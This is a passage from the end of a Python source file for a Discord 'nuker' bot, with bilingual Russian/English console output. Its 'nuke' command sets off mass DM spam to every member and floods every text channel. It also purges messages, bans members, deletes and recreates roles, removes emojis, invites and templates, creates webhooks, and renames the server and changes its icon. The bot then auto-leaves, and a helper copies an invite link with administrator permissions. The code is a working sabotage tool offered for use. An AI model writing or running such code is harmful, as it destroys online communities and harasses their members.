          1 else f'{Fore.RED}[{Fore.WHITE}+{Fore.RED}] {context.guild.id}/Guild - Server renamed')


async def DM_USER(context, member):
    try:
        await member.send(data['DM_SPAM'])
    except:
        print(
            Fore.RED +
            f'{Fore.RED}[{Fore.WHITE}!{Fore.RED}] ОШИБКА: {member.id}/Участник - Не удалось запустить флуд в ЛС'
            if lang == 1 else
            f'{Fore.RED}[{Fore.WHITE}!{Fore.RED}] ОШИБКА: {member.id}/Member - Failed to spam DM')


async def CM_FLOOD_DM(context):
    for member in context.guild.members:
        asyncio.create_task(DM_USER(context, member))


async def CM_PURGE(context):
    try:
        await context.channel.purge(limit=None)
    except:
        pass


async def CM_DELETE_ALL_EMOJIS(context):
    for emoji in context.guild.emojis:
        asyncio.create_task(DELETE_OBJECT(emoji, 'Emoji||Эмодзи'))


async def CM_DELETE_ALL_INVITES(context):
    for invite in await context.guild.invites():
        asyncio.create_task(DELETE_OBJECT(invite, 'Invite||Приглашение'))
    print(
        Fore.RED +
        f'{Fore.RED}[{Fore.WHITE}+{Fore.RED}] OK - Созданы задачи по удалению всех приглашений'
        if lang == 1 else
        f'{Fore.RED}[{Fore.WHITE}+{Fore.RED}] OK - Created tasks to delete all invites'
    )


async def CM_CREATE_WEBHOOKS(context):
    if not data['NUKER_OPTIONS']['CREATE_CHANNELS']:
        for _ in range(ceil(50 / len(context.guild.channels))):
            for x in context.guild.channels:
                asyncio.create_task(CREATE_WEBHOOK(context, x)) # TODO:


async def CM_DELETE_TEMPLATES(context):
    for template in await context.guild.templates():
        asyncio.create_task(DELETE_OBJECT(template, entityName = 'Template||Шаблон')) #TODO:


async def CM_CHANGE_SERVER_ICON(context):
    icon = open(data['NUKER_OPTIONS']['SERVER_ICON'], 'rb').read()

    await context.guild.edit(icon=icon)

    print(
                Fore.RED +
                f'{Fore.RED}[{Fore.WHITE}+{Fore.RED}] {context.guild.id}/Сервер - Успешно изменена иконка сервера'
                if lang == 1 else
                f'{Fore.RED}[{Fore.WHITE}+{Fore.RED}] {context.guild.id}/Guild - Successfully changed server icon'
            )


async def CM_TOTAL_SPAM(context):
    for channel in context.guild.channels:
        if type(channel) == discord.TextChannel:
            print(
                Fore.RED +
                f'{Fore.RED}[{Fore.WHITE}+{Fore.RED}] {channel.id}/Канал - Запущен флуд на #{channel.name}'
                if lang == 1 else
                f'{Fore.RED}[{Fore.WHITE}+{Fore.RED}] {channel.id}/Channel - Started flood attack to #{channel.name}'
            )
            asyncio.create_task(FLOOD_CHANNEL(channel))


@Client.command()
async def nuke(context):
    Clear()

    try:
        await context.message.delete()

    except:
        pass

    # TODO:

    if data['SHOW_START_MESSAGE']:
        msg = await context.send(data['NUKER_START_MESSAGE'])
        print(
                Fore.RED +
                f'{Fore.RED}[{Fore.WHITE}+{Fore.RED}] {msg.id}/Сообщение - Отправлено сообщение о запуске'
                if lang == 1 else
                f'{Fore.RED}[{Fore.WHITE}+{Fore.RED}] {msg.id}/Message - Sended start message'
            )
        await asyncio.sleep(3)

    if data['NUKER_OPTIONS']['RENAME_GUILD']:
        asyncio.create_task(CM_RENAME_GUILD(context))

    if data['NUKER_OPTIONS']['PURGE']:
        asyncio.create_task(CM_PURGE(context))

    if data['NUKER_OPTIONS']['FLOOD_DM']:
        asyncio.create_task(CM_FLOOD_DM(context))

    if data['NUKER_OPTIONS'][
            'TOTAL_SPAM'] and not data['NUKER_OPTIONS']['CREATE_CHANNELS']:
        asyncio.create_task(CM_TOTAL_SPAM(context))

    if data['NUKER_OPTIONS']['CREATE_CHANNELS']:
        asyncio.create_task(CM_CDCHANNELS(context))

    if data['NUKER_OPTIONS']['CDROLES']:
        asyncio.create_task(CM_DELETE_ROLES(context))
        asyncio.create_task(CM_CREATE_ROLES(context))

    if data['NUKER_OPTIONS']['BAN_MEMBERS']:
        asyncio.create_task(CM_MEMBER_BAN(context))

    if data['NUKER_OPTIONS']['DELETE_EMOJIS']:
        asyncio.create_task(CM_DELETE_ALL_EMOJIS(context))

    if data['NUKER_OPTIONS']['DELETE_INVITES']:
        asyncio.create_task(CM_DELETE_ALL_INVITES(context))

    if data['NUKER_OPTIONS']['CREATE_WEBHOOKS']:
        asyncio.create_task(CM_CREATE_WEBHOOKS(context))

    if data['NUKER_OPTIONS']['DELETE_TEMPLATES']:
        asyncio.create_task(CM_DELETE_TEMPLATES(context))

    if data['NUKER_OPTIONS']['CHANGE_SERVER_ICON']:
        asyncio.create_task(CM_CHANGE_SERVER_ICON(context))

    if data['AUTO_LEAVE']:
        await asyncio.sleep(data['AUTO_LEAVE_SEC'])
        await context.guild.leave()
        print(
            f'{Fore.RED}[{Fore.WHITE}i{Fore.RED}] {Fore.GREEN}Авто-выход: Бот вышел из сервера: {context.guild.name}\nКраш сервера окончен.'
            if lang == 1 else
            f'{Fore.RED}[{Fore.WHITE}i{Fore.RED}] {Fore.GREEN}Auto-Leave: Bot leaved from guild: {context.guild.name}\nServer crash finished.'
        )
        exit(0)


def KEYBOARD_LISTENER_F12():
    try:
        while True:
            if is_pressed('F12'):
                print(
                    f'{Fore.RED}[{Fore.WHITE}+{Fore.RED}] {Fore.YELLOW}Программа остановлена{Fore.WHITE}'
                    if lang == 1 else
                    f'{Fore.RED}[{Fore.WHITE}+{Fore.RED}] {Fore.YELLOW}Program stopped{Fore.WHITE}'
                )
                _exit(0)

            sleep(.05)
    except Exception as e:
        print(
            f'{Fore.RED}[{Fore.WHITE}x{Fore.RED}] {Fore.YELLOW}KEYBOARD_LISTENER_F12 -> Ошибка запуска'
            if lang == 1 else
            f'{Fore.RED}[{Fore.WHITE}x{Fore.RED}] {Fore.YELLOW}KEYBOARD_LISTENER_F12 -> Starting error'
        )


def KEYBOARD_LISTENER_CTRL_U():
    try:
        while True:
            if is_pressed('Ctrl+U'):
                copy(
                    f'https://discord.com/api/oauth2/authorize?client_id={Client.user.id}&permissions=8&scope=bot'
                )

                if platform == 'win32':
                    windll.user32.MessageBoxW(
                        0,
                        f'https://discord.com/api/oauth2/authorize?client_id={Client.user.id}&permissions=8&scope=bot',
                        'Ссылка для приглашения скопирована'
                        if lang == 1 else 'Invite link copied', 0x40)

            sleep(.05)
    except Exception as e:
        print(
            f'{Fore.RED}[{Fore.WHITE}x{Fore.RED}] {Fore.YELLOW}KEYBOARD_LISTENER_CTRL_U -> Ошибка запуска'
            if lang == 1 else
            f'{Fore.RED}[{Fore.WHITE}x{Fore.RED}] {Fore.YELLOW}KEYBOARD_LISTENER_CTRL_U -> Starting error'
        )


@Client.event
async def on_ready():

    Clear()

    ShowLabel()

    Thread(target=lambda: KEYBOARD_LISTENER_F12()).start()

    Thread(target=lambda: KEYBOARD_LISTENER_CTRL_U()).start()

    if len(Client.guilds) == 0:
        print(Fore.RED + f'Бот не приглашён ни на один сервер!\n' if lang ==
              1 else Fore.RED + f'Bot is not invited to any server!\n')
        __SlowType(
            Fore.RED +
            f'Пригласите бота на сервер, используя ссылку{Fore.GREEN}\nhttps://discord.com/api/oauth2/authorize?client_id={Client.user.id}&permissions=8&scope=bot\n\n{Fore.RED}и запустите программу заново.'
            if lang == 1 else Fore.RED +
            f'Add bot to server, using authorization link{Fore.GREEN}\nhttps://discord.com/api/oauth2/authorize?client_id={Client.user.id}&permissions=8&scope=bot\n\n{Fore.RED}and run this script again.',
            .001, True)
        input(Fore.YELLOW + f'\nENTER {Fore.RED}> Выйти ')
        print(Fore.WHITE)

        _exit(0)

    if is_found:
        SlowType(
            f'{Fore.RED}[{Fore.WHITE}i{Fore.RED}] {Fore.YELLOW}Автоматическое обнаружение конфига: ./nuker.py\n'
            if lang == 1 else
            f'{Fore.RED}[{Fore.WHITE}+{Fore.RED}] {Fore.YELLOW}Config auto-detect: ./nuker.py\n'
        )

    if data['AUTO_LEAVE']:
        SlowType(
            f'{Fore.RED}[{Fore.WHITE}+{Fore.RED}] {Fore.YELLOW}Авто-выход: Запланирован через {data["AUTO_LEAVE_SEC"]} сек после запуска.\n'
            if lang == 1 else
            f'{Fore.RED}[{Fore.WHITE}+{Fore.RED}] {Fore.YELLOW}Auto-Leave: Planned for {data["AUTO_LEAVE_SEC"]} sec after start.\n'
        )

    SlowType(
        f'{Fore.RED}[{Fore.WHITE}+{Fore.RED}] {Fore.YELLOW}F12: Остановить'
        if lang ==
        1 else f'{Fore.RED}[{Fore.WHITE}+{Fore.RED}] {Fore.YELLOW}F12: Stop')

    SlowType(
        f'{Fore.RED}[{Fore.WHITE}+{Fore.RED}] {Fore.YELLOW}CTRL+U: Скопировать пригласительную ссылку\n'
        if lang == 1 else
        f'{Fore.RED}[{Fore.WHITE}+{Fore.RED}] {Fore.YELLOW}CTRL+U: Copy invite link\n'
    )
    SlowType(
        f'{Fore.RED}[{Fore.WHITE}+{Fore.RED}] {Fore.YELLOW}Бот: {Fore.GREEN}{Client.user.name}{Fore.RED}#{Fore.GREEN}{Client.user.discriminator}'
        if lang == 1 else
        f'{Fore.RED}[{Fore.WHITE}+{Fore.RED}] {Fore.YELLOW}Bot: {Fore.GREEN}{Client.user.name}{Fore.RED}#{Fore.GREEN}{Client.user.discriminator}'
    )
    SlowType(
        f'{Fore.RED}[{Fore.WHITE}+{Fore.RED}] {Fore.YELLOW}Кол-во серверов: {Fore.GREEN}{len(Client.guilds)}'
        if lang == 1 else
        f'{Fore.RED}[{Fore.WHITE}+{Fore.RED}] {Fore.YELLOW}Servers: {Fore.GREEN}{len(Client.guilds)}'
    )
    SlowType(
        f'{Fore.RED}[{Fore.WHITE}+{Fore.RED}] {Fore.YELLOW}Префикс команд: {Fore.GREEN}{Client.command_prefix}\n'
        if lang == 1 else
        f'{Fore.RED}[{Fore.WHITE}+{Fore.RED}] {Fore.YELLOW}Command prefix: {Fore.GREEN}{Client.command_prefix}\n'
    )
    SlowType(Fore.YELLOW +
             f'{Client.command_prefix}{Fore.RED}nuke{Fore.YELLOW} - запуск\n'
             if lang == 1 else Fore.YELLOW +
             f'{Client.command_prefix}{Fore.RED}nuke{Fore.YELLOW} - start\n')


@Client.event
async def on_guild_join(guild):
    SlowType(
        f'{Fore.RED}[{Fore.WHITE}+{Fore.RED}] {Fore.YELLOW}Добавлен на сервер: {guild.name} ({guild.id})'
        if lang == 1 else
        f'{Fore.RED}[{Fore.WHITE}+{Fore.RED}] {Fore.YELLOW}Added to server: {guild.name} ({guild.id})'
    )


try:
    Client.run(data['BOT_TOKEN'])
except:
    Clear()
    SlowType(
        f'{Fore.RED}[{Fore.WHITE}x{Fore.RED}] {Fore.YELLOW}Неверный токен: {data["BOT_TOKEN"]}{Fore.WHITE}'
        if lang == 1 else
        f'{Fore.RED}[{Fore.WHITE}x{Fore.RED}] {Fore.YELLOW}Invalid token: {data["BOT_TOKEN"]}{Fore.WHITE}'
    )
    SlowType(
        f'{Fore.RED}[{Fore.WHITE}!{Fore.RED}] {Fore.YELLOW}Если смена токена не помогла, или вы уверены, что токен верный, включите интенты.{Fore.WHITE}'
        if lang == 1 else
        f'{Fore.RED}[{Fore.WHITE}!{Fore.RED}] {Fore.YELLOW}If token change does not help, enable intents.{Fore.WHITE}'
    )
    input(Fore.YELLOW + f'\nENTER {Fore.RED}> Выйти ' +
          ResetColor() if lang == 1 else Fore.YELLOW +
          f'\nENTER {Fore.RED}> Quit ' + ResetColor())